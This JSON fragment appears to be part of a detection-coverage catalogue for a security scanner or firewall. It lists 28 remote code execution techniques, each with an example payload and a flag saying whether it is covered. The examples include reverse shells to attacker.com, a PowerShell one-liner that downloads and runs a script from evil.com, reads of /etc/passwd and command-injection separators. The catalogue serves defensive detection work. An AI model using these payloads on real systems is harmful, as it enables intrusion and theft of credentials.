    "Remote Code Execution (RCE)": {
      "owasp": "A03:2021",
      "severity": "CRITICAL",
      "techniques": [
        {"id":"RCE-01","name":"Semicolon separator","example":"; ls -la","covered":true},
        {"id":"RCE-02","name":"Pipe injection","example":"| whoami","covered":true},
        {"id":"RCE-03","name":"Backtick execution","example":"`id`","covered":true},
        {"id":"RCE-04","name":"$() subshell","example":"$(cat /etc/passwd)","covered":true},
        {"id":"RCE-05","name":"PHP eval()","example":"eval($_GET['cmd'])","covered":true},
        {"id":"RCE-06","name":"PHP system()","example":"system('id')","covered":true},
        {"id":"RCE-07","name":"PHP exec()","example":"exec('whoami')","covered":true},
        {"id":"RCE-08","name":"PHP shell_exec()","example":"shell_exec('ls')","covered":true},
        {"id":"RCE-09","name":"PHP passthru()","example":"passthru('id')","covered":true},
        {"id":"RCE-10","name":"PHP popen()","example":"popen('cat /etc/passwd','r')","covered":true},
        {"id":"RCE-11","name":"PHP assert()","example":"assert('system(id)')","covered":true},
        {"id":"RCE-12","name":"PHP preg_replace /e","example":"preg_replace('/.*/e','system(id)')","covered":true},
        {"id":"RCE-13","name":"Python __import__","example":"__import__('os').system('id')","covered":true},
        {"id":"RCE-14","name":"Python subprocess","example":"subprocess.Popen(['id'])","covered":true},
        {"id":"RCE-15","name":"Python os.system","example":"os.system('whoami')","covered":true},
        {"id":"RCE-16","name":"PowerShell IEX","example":"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')","covered":true},
        {"id":"RCE-17","name":"PowerShell Invoke-Expression","example":"Invoke-Expression 'whoami'","covered":true},
        {"id":"RCE-18","name":"Reverse shell bash","example":"bash -i >& /dev/tcp/attacker.com/4444 0>&1","covered":true},
        {"id":"RCE-19","name":"Reverse shell netcat","example":"nc -e /bin/sh attacker.com 4444","covered":true},
        {"id":"RCE-20","name":"mkfifo reverse shell","example":"mkfifo /tmp/f; cat /tmp/f | /bin/sh | nc attacker 4444","covered":true},
        {"id":"RCE-21","name":"Base64 encoded command","example":"echo YmFzaCAtaQ== | base64 -d | bash","covered":true},
        {"id":"RCE-22","name":"&& command chaining","example":"valid_cmd && id","covered":true},
        {"id":"RCE-23","name":"Newline injection","example":"%0a id","covered":true},
        {"id":"RCE-24","name":"$IFS bypass","example":"cat$IFS/etc/passwd","covered":true},
        {"id":"RCE-25","name":"Node.js child_process","example":"require('child_process').exec('id')","covered":true},
        {"id":"RCE-26","name":"SSTI to RCE","example":"{{''.__class__.__mro__[1].__subclasses__()}}","covered":true},
        {"id":"RCE-27","name":"Java Runtime.exec","example":"Runtime.getRuntime().exec('id')","covered":true},
        {"id":"RCE-28","name":"Deserialization RCE","example":"Java/PHP/Python gadget chain","covered":false,"note":"Requires deep inspection"}
      ]
